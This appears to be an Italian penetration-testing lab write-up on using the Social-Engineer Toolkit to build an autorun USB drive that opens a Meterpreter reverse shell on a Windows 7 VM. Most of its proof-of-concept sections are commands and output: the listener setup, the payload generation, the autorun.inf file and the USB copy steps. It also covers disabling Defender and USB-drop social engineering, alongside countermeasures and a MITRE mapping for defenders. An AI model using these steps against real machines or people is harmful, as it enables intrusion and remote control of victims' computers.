> [English](README.en.md) | **Italiano**

# SET Infectious Media Generator: Autorun USB Payload

> - **Fase:** Social Engineering - Infectious Media Generator - Physical Access Vector
> - **Visibilita:** Media - l'inserimento USB viene registrato nei log di sistema (Event ID 6416 per PnP); l'esecuzione del payload puo triggerare AV/EDR; nessun traffico di rete nella fase di delivery (consegna fisica)
> - **Prerequisiti:** SET installato su Kali Linux; supporto USB formattato; accesso fisico all'area target per il drop della chiavetta; Metasploit per il listener reverse shell; target con autorun abilitato (Windows 7/legacy) o ingegneria sociale per indurre l'apertura manuale
> - **Output:** Finding SE-005 (severity Medio); file autorun.inf + payload eseguibile generati da SET; struttura pronta per la copia su supporto USB

- **Ambiente Operativo:** Kali Linux (Attaccante 192.168.0.110), Windows 7 VM (Vittima 192.168.0.115)
- **Target:** Workstation con autorun abilitato (ambiente legacy simulato)
- **Framework:** Social-Engineer Toolkit (SET) + Metasploit Framework
- **Tecnica Documentata:** Infectious Media Generator - Autorun payload per supporti rimovibili

---

## Executive Summary

L'Infectious Media Generator di SET automatizza la creazione di payload per supporti rimovibili (USB drive) con configurazione autorun. La tecnica sfrutta il meccanismo AutoRun/AutoPlay di Windows per eseguire automaticamente un payload al mount del dispositivo USB. Sebbene AutoRun sia disabilitato di default a partire da Windows 7 SP1 (Microsoft Security Advisory 967940), la tecnica resta rilevante in tre contesti: ambienti legacy (Windows XP/7 non aggiornati, sistemi industriali SCADA/ICS), ambienti con policy GPO che riabilitano AutoRun, e scenari in cui l'ingegneria sociale convince l'utente ad aprire manualmente il file.

Nel laboratorio e stata generata la struttura autorun (file `autorun.inf` + payload eseguibile) e testata su una VM Windows 7 con AutoRun abilitato. L'inserimento della chiavetta USB ha triggerat l'esecuzione automatica del payload, stabilendo una reverse shell verso la macchina attaccante.

---

## Finding SE-005: Payload Autorun su Supporto USB

**ID Finding:** `SE-005` | **Severity:** `Medio` | **CVSS:** 5.3

Un attaccante con accesso fisico all'area target puo depositare un supporto USB contenente un payload con autorun.inf. Su sistemi con AutoRun abilitato, il payload viene eseguito automaticamente al mount del dispositivo. Su sistemi moderni, l'utente deve aprire manualmente il file, ma l'ingegneria sociale (nome file ingannevole, etichetta USB accattivante) puo indurre l'apertura.

**Scenario PoC:** L'analista genera tramite SET una struttura autorun con payload Meterpreter, la copia su un drive USB e la inserisce nella VM Windows 7 target. L'autorun esegue il payload e stabilisce una reverse shell.

### PoC - Fase 1: Setup del Listener

```Bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.110
set LPORT 4445
exploit -j
```

```
[*] Payload handler running as background job 0.
[*] Started reverse TCP handler on 192.168.0.110:4445                <--
```

### PoC - Fase 2: Generazione Payload con SET

```Bash
sudo setoolkit
```

```
set> 1    # Social-Engineering Attacks

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator                       <--
   ...

set> 3
```

```
   The Infectious USB/CD/DVD module will create an autorun.inf
   file and a Metasploit payload. When the USB/CD/DVD is
   inserted, it will automatically run if autorun is enabled.

   1) File-Format Exploits                             <--
   2) Standard Metasploit Executable

set:infectious> 1
```

```
[-] LHOST for reverse connection: 192.168.0.110                      <--
[-] LPORT for reverse connection: 4445                               <--

[*] Generating the payload... please be patient.
[*] Payload has been created.

[*] Your files have been generated and stored in:
    /root/.set/autorun/                                              <--

    Files created:
    - autorun.inf                                                    <--
    - payload.exe                                                    <--

[*] Copy the contents of /root/.set/autorun/ to your USB drive.
```

### PoC - Fase 3: Analisi della Struttura Generata

```Bash
cat /root/.set/autorun/autorun.inf
```

```
[autorun]
open=payload.exe                                                     <--
icon=autorun.ico
action=Open folder to view files
```

```Bash
ls -la /root/.set/autorun/
```

```
total 76
drwxr-xr-x 2 root root  4096 Mar 28 15:10 .
drwxr-xr-x 5 root root  4096 Mar 28 15:10 ..
-rw-r--r-- 1 root root    72 Mar 28 15:10 autorun.inf
-rwxr-xr-x 1 root root 73802 Mar 28 15:10 payload.exe              <--
```

### PoC - Fase 4: Copia su USB e Test su Target

I file vengono copiati sul drive USB (montato su Kali come `/media/usb`).

```Bash
cp /root/.set/autorun/* /media/usb/
sync
umount /media/usb
```

Al mount del drive USB sulla VM Windows 7, AutoRun esegue `payload.exe` come specificato in `autorun.inf`.

```
[*] Sending stage (176198 bytes) to 192.168.0.115                   <--
[*] Meterpreter session 1 opened (192.168.0.110:4445 ->
    192.168.0.115:49851) at 2026-03-28 15:18:22 +0200               <--

meterpreter > getuid
Server username: WIN7-LAB\utente                                     <--
```

---

## Impatto e Remediation (Blue Team)

L'esecuzione di payload tramite supporto USB fornisce all'attaccante accesso al sistema target senza alcuna interazione di rete nella fase di delivery. Il vettore fisico bypassa completamente i controlli perimetrali (firewall, email gateway, proxy).

### Contromisure raccomandate

1. **Disabilitazione AutoRun via Group Policy:** `Computer Configuration -> Administrative Templates -> Windows Components -> AutoPlay Policies -> Turn off AutoPlay: All drives`. Questa e la contromisura piu efficace e a costo zero.
2. **USB Device Control:** soluzioni come Microsoft Defender for Endpoint Device Control, Symantec DLP, o Carbon Black per bloccare o limitare l'accesso ai dispositivi USB rimovibili.
3. **Endpoint Protection:** AV/EDR con scansione real-time dei media rimovibili al mount. I payload generati da SET sono tipicamente rilevati dalle firme standard.
4. **Security Awareness:** formazione specifica sul rischio dei dispositivi USB trovati. Il test "USB drop" (depositare chiavette in aree comuni e misurare il tasso di apertura) e un esercizio standard nelle campagne di awareness.
5. **Physical Security:** controllo accessi alle aree di lavoro; policy che vietano l'uso di USB personali su workstation aziendali.

---

## Esperienza di Laboratorio

L'ambiente di test ha richiesto una configurazione specifica: la VM Windows 10 di laboratorio aveva AutoRun disabilitato di default, rendendo impossibile l'esecuzione automatica. Per testare la tecnica nella sua forma originale e stato necessario utilizzare una VM Windows 7 con AutoRun abilitato.

La generazione dei file con SET e stata rapida e automatica: il framework ha invocato msfvenom per creare il payload Meterpreter e ha generato il file `autorun.inf` con la direttiva `open=payload.exe`. L'intera operazione ha richiesto meno di un minuto.

Il trasferimento dei file su USB ha richiesto attenzione pratica: su Kali il drive USB va montato manualmente (`mount /dev/sdb1 /media/usb`) e dopo la copia e necessario eseguire `sync` prima dell'unmount per assicurare la scrittura completa dei dati. Un errore comune in laboratorio e dimenticare il sync, risultando in file corrotti sulla chiavetta.

Il test sulla VM Windows 7 ha confermato l'esecuzione automatica: al mount del drive, Windows ha mostrato brevemente la finestra AutoPlay e poi ha eseguito il payload. La reverse shell si e stabilita in circa 5 secondi. La detection da parte di Windows Defender (anche sulla VM Windows 7) e stata immediata - il payload e stato quarantinato prima dell'esecuzione. Per completare il test e stato necessario disabilitare Defender, confermando che la tecnica nella sua forma grezza e oggi rilevata anche su sistemi legacy.

Un'osservazione importante: in un engagement reale moderno, l'attaccante non userebbe un payload .exe con autorun. Le tecniche attuali prevedono file .lnk (shortcut) che puntano a script PowerShell, o file .iso contenenti .lnk + .dll, sfruttando il fatto che Windows monta automaticamente le immagini ISO al doppio click. L'autorun.inf e una tecnica legacy che questo laboratorio documenta per completezza storica e per la comprensione del principio sottostante.

---

## Analisi Teorica: Vettore Fisico e Ingegneria Sociale

L'attacco via media rimovibili sfrutta due vulnerabilita distinte:

1. **Vulnerabilita tecnica (AutoRun):** il meccanismo AutoRun di Windows esegue automaticamente il file specificato in `autorun.inf` al mount del dispositivo. Microsoft ha mitigato questa vulnerabilita con la Security Advisory 967940 (2011), disabilitando AutoRun per i dispositivi USB. Tuttavia, AutoRun resta attivo per CD/DVD su molti sistemi, e alcune organizzazioni riabilitano AutoRun via GPO per ragioni operative.

2. **Vulnerabilita umana (curiosita):** studi accademici (Tischer et al., 2016 - "Users Really Do Plug In USB Drives They Find") hanno dimostrato che il 48% delle chiavette USB depositate in aree pubbliche vengono inserite nei computer entro poche ore. L'etichettatura del dispositivo ("Salary_Report_2026", "Confidential_HR") aumenta significativamente il tasso di apertura.

La combinazione di queste due vulnerabilita rende l'attacco efficace anche quando una sola delle due e presente: su sistemi con AutoRun, il payload si esegue senza interazione; su sistemi senza AutoRun, l'ingegneria sociale puo convincere l'utente ad aprire manualmente il file.

Nel contesto MITRE ATT&CK, la tecnica T1091 (Replication Through Removable Media) e classificata come Initial Access vector. Storicamente, e stata utilizzata in operazioni di stato-nazione: Stuxnet (2010) si e propagato inizialmente tramite chiavette USB nei siti nucleari iraniani, dimostrando che il vettore fisico puo raggiungere anche sistemi air-gapped.

La severity Medio riflette il requisito di accesso fisico e la disabilitazione di AutoRun sui sistemi moderni. In ambienti specifici (industria, infrastrutture critiche con sistemi legacy), la severity effettiva sarebbe piu alta.

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Utilizzo di SET per la generazione automatica del payload e del file autorun.inf per supporto USB. |
| Initial Access | Replication Through Removable Media | `T1091` | Payload consegnato tramite chiavetta USB depositata nell'area target; esecuzione automatica via AutoRun o manuale via ingegneria sociale. |
| Execution | User Execution: Malicious File | `T1204.002` | Su sistemi senza AutoRun, la vittima apre manualmente il file payload indotta dall'etichettatura ingannevole del dispositivo. |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato (VirtualBox, rete NAT/Bridge isolata). Il supporto USB e stato utilizzato esclusivamente tra macchine virtuali di proprieta dell'autore. Nessun dispositivo e stato depositato in aree pubbliche o consegnato a persone reali.
